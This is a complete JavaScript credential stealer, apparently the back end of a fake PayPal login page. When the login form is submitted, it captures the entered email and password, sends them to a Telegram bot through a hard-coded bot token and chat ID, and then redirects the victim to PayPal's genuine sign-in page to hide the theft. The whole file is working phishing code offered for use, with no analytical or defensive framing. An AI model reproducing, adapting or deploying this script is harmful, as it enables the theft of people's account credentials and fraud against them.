document.addEventListener('DOMContentLoaded', function() {
    var form = document.getElementById('loginForm');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var time = new Date().toLocaleString();
            var message = "[" + time + "] Email: " + email + " | Pass: " + password;
            var botToken = "8926881219:AAFEhuTyYVbgIMDDiV8JDZ2ivXmz4elyGBI";
            var chatId = "8510854191";
            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            fetch(url, { method: 'GET' })
                .then(function() { window.location.href = 'https://www.paypal.com/signin'; })
                .catch(function() { window.location.href = 'https://www.paypal.com/signin'; });
        });
    }
});
